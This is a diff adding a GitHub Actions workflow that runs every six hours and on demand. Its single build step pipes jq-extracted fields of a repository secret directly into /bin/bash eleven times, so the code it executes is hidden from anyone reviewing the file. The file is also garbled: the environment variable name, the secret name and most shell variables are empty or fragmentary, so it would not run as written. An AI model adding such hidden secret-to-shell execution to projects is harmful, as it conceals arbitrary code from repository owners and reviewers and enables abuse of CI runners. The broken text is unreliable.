@@ -1,0 +1,26 @@
+name: wuhaoning3214
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          : ${{ secrets. }}
+        run: |
+          echo $ | jq -r .8 | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $l1 | jq -r .l | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $ | jq -r .m | /bin/bash
+          echo $uw | jq -r . | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $ | jq -r . | /bin/bash
+          echo $ | jq -r . | /bin/bash
+
